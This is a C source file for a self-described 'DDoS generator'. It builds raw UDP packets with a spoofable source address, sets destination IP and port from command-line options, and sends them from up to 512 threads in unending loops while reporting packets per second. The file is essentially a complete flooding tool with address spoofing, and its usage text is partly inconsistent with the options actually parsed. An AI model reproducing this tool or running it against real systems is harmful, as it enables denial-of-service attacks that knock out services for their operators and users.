#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <netdb.h>
#include <unistd.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in_systm.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/if_ether.h>
#include <arpa/inet.h>
#include <ifaddrs.h>
#include <pcap.h>
#include <pthread.h>
#include <time.h>

#define PKT_BUF_SIZE 1600
#define MAX_IFNAME_LEN 20
#define MAX_THREADS 512
#define PIM_HELLO_GROUP "127.0.0.1"
#define PIM_HELLO_INTERVAL 1
#define VERSION "2012-02-17.01"
#define MAX_DATA_SIZE 2000
#define __FAVOR_BSD 1

//int debug = 0;						/* 1 = debug mode */
pthread_t thread, pim_thread;		/* pim hello thread */

typedef	struct udp_pkt_s {
	struct ip ip;
	struct udphdr udp;
	char data[MAX_DATA_SIZE];
} udp_pkt_t;

typedef struct opts_s {

	int debug;
	int threads;
	udp_pkt_t pkt;
	int snd_sock;
	pthread_mutex_t mutex;

	unsigned long pkts_send;
	int time_start; 
	int refresh; 

} opts_t;


void usage(void) {
	printf("DDoS generator %s\n", VERSION);
	printf("Usage:\n");
	printf("ddosgen -i <input_interface> -o <output_interface> [ -p ]  [ -s ] [ -t <ttl> ] <group> [ <group> [ ... ] ]\n");
	printf(" -s : src ip\n");
	printf(" -d : dst  ip\n");
	printf(" -S : src port\n");
	printf(" -D : dst port\n");
	printf(" -l : packet length\n");
	printf(" -t : number of threads\n");
	printf(" -r : refresh statistics every n secs \n");
	exit(1);
}

int inet_cksum(addr, len) 
u_int16_t *addr; 
u_int len;
{
    register int nleft = (int)len;
    register u_int16_t *w = addr;
    u_int16_t answer = 0;
    register int sum = 0;


    /*
     *  Our algorithm is simple, using a 32 bit accumulator (sum),
     *  we add sequential 16 bit words to it, and at the end, fold
     *  back all the carry bits from the top 16 bits into the lower
     *  16 bits.
     */
    while (nleft > 1)  {
        sum += *w++;
        nleft -= 2;
    }

    /* mop up an odd byte, if necessary */
    if (nleft == 1) {
        *(u_char *) (&answer) = *(u_char *)w ;
        sum += answer;
    }

    /*
     * add back carry outs from top 16 bits to low 16 bits
     */
    sum = (sum >> 16) + (sum & 0xffff); /* add hi 16 to low 16 */
    sum += (sum >> 16);         /* add carry */
    answer = ~sum;              /* truncate to 16 bits */
    return (answer);
}




u_short cksum(u_short *buf, int count) {
	register u_long sum = 0;
	while (count--) {
		sum += *buf++;
		if (sum & 0xFFFF0000) { 
			/* carry occurred, so wrap around */
			sum &= 0xFFFF;
			sum++;
		}
	}
	return ~(sum & 0xFFFF);
}

u_short crc16(u_char *data, int len) {
    u_short *p = (u_short *)data,
            crc = 0;
    int     size = len >> 1;

    while(size--) crc ^= *p++;
           // this ntohs(htons) is needed for big/little endian compatibility
    if(len & 1) crc ^= ntohs(htons(*p) & 0xff00);
    return(crc);
}


int get_if(char *if_str, char *if_namep, struct in_addr *if_addrp) {

	struct ifaddrs *ifa; 
	struct sockaddr_in *sin;

	if (getifaddrs(&ifa)) {
		perror("getifaddrs");
		exit(1);
	}

	while (ifa != NULL) {
		/* we are intersted only on AF_INET address */
		if (ifa->ifa_addr->sa_family == AF_INET) {
			sin = (struct sockaddr_in *)ifa->ifa_addr;
			/* interface with name if_str was found */
			if (strcmp(ifa->ifa_name, if_str) == 0 || strcmp(inet_ntoa(sin->sin_addr), if_str) == 0) {

				bzero(if_namep, MAX_IFNAME_LEN);
				bzero(if_addrp, sizeof(struct in_addr));
				memcpy(if_namep, ifa->ifa_name, strlen(ifa->ifa_name) < MAX_IFNAME_LEN ? strlen(ifa->ifa_name) : 0);
				memcpy(if_addrp, &(sin->sin_addr), sizeof(struct in_addr));
	
				return 1;
			} 
		}
		ifa = ifa->ifa_next;
	}
	return 0;
}

int sock_init(opts_t *opts) {

	u_int yes = 1;

	if ((opts->snd_sock=socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {   
		perror("snd_pim_sock socket");
		return 0;
	}

	if (setsockopt(opts->snd_sock, IPPROTO_IP, IP_HDRINCL,(char *)&yes, sizeof(yes)) < 0 ) {
		perror("setsockopt IP_HDRINCL (pim_sock)");
		return 0;	
	}

	return 1;
}

void *stats_loop(opts_t *opts) {

	int tm;

	while (1) {

		sleep(opts->refresh);
		tm = time(NULL);

		pthread_mutex_lock(&opts->mutex);
		printf("Send %lu pkts in %d secs (%lu pps)\n", 
			opts->pkts_send, 
			tm - opts->time_start,
			opts->pkts_send / (tm - opts->time_start)  );

		opts->pkts_send = 0;
		opts->time_start = tm;
		pthread_mutex_unlock(&opts->mutex);

	}

}

void *gen_pkt_loop(opts_t *opts) {

//	struct in_addr if_addr;
	udp_pkt_t udpp;
	struct sockaddr_in dst_addr;
	int pkts = 0;
	
	bzero(&udpp, sizeof(udpp));
	memcpy(&udpp, &opts->pkt, sizeof(udp_pkt_t));
	udpp.ip.ip_v      = 0x4;
	udpp.ip.ip_hl     = 0x5;
	udpp.ip.ip_ttl    = 0x16;
	udpp.ip.ip_p      = IPPROTO_UDP;
	udpp.ip.ip_len    = 100;
	udpp.udp.uh_sum 	= htons(0x0000);

	memset(&dst_addr, 0, sizeof(dst_addr));
	dst_addr.sin_family			= AF_INET;
	dst_addr.sin_addr.s_addr	= inet_addr(PIM_HELLO_GROUP);
	dst_addr.sin_port			= htons(0);


	while (1) {
		if (sendto(opts->snd_sock, (char *)&udpp, udpp.ip.ip_len, 0, (struct sockaddr *)&dst_addr, sizeof(dst_addr)) < 0 ) {
			perror("udp_sendto");
		} 
		if (opts->debug) { printf("UDP sent \n"); }

		if (pkts > 1000) {
			pthread_mutex_lock(&opts->mutex);
			opts->pkts_send += pkts;
			pthread_mutex_unlock(&opts->mutex);
			pkts = 0;
		}
		pkts++;
		//usleep(PIM_HELLO_INTERVAL);
	}
}

int main(int argc, char *argv[]) {

	char op;
	opts_t opts;
	pthread_t loop_threads[MAX_THREADS]; 	
	int i;

	/* default options */
	memset(&opts, 0x0, sizeof(opts_t));
	inet_aton("127.0.0.1", &opts.pkt.ip.ip_src);
	inet_aton("127.0.0.1", &opts.pkt.ip.ip_dst);	
	opts.pkt.udp.uh_sport = htons(2222);
	opts.pkt.udp.uh_dport = htons(111);
	opts.pkt.udp.uh_ulen = htons(100);

	opts.threads = 1;
	opts.refresh = 1;


	/* parse input parameters */
	while ((op = getopt(argc, argv, "?vs:d:S:D:l:c:t:r:")) != -1) {
		switch (op) {
			case 's': inet_aton(optarg, &opts.pkt.ip.ip_src); break;
			case 'd': inet_aton(optarg, &opts.pkt.ip.ip_dst); break;
			case 'S': opts.pkt.udp.uh_sport = htons(atoi(optarg)); break;
			case 'D': opts.pkt.udp.uh_dport = htons(atoi(optarg)); break;
			case 'l': opts.pkt.udp.uh_ulen = htons(atoi(optarg)); break;
			case 'c': strcpy(opts.pkt.data, optarg); break;
			case 'v': opts.debug = 1; break;
			case 't': 
					opts.threads = atoi(optarg); 
					if (opts.threads >= MAX_THREADS) {
						opts.threads = MAX_THREADS;
					}
					break;
			case 'r': opts.refresh = atoi(optarg); break;
			case '?': usage();
		}
	}

	opts.time_start = time(NULL);

	sock_init(&opts);

//	gen_pkt_loop(&opts);

	if (pthread_mutex_init(&opts.mutex, NULL) != 0) {
		perror("pthread_mutex_init error");
	}

	for (i = 0; i < opts.threads; i++) {
		if (pthread_create(&loop_threads[i], NULL, (void*)gen_pkt_loop, (void *)&opts) != 0) {
			perror("Pthread_create error");
		}
	}

	stats_loop(&opts);


	exit(2);

}


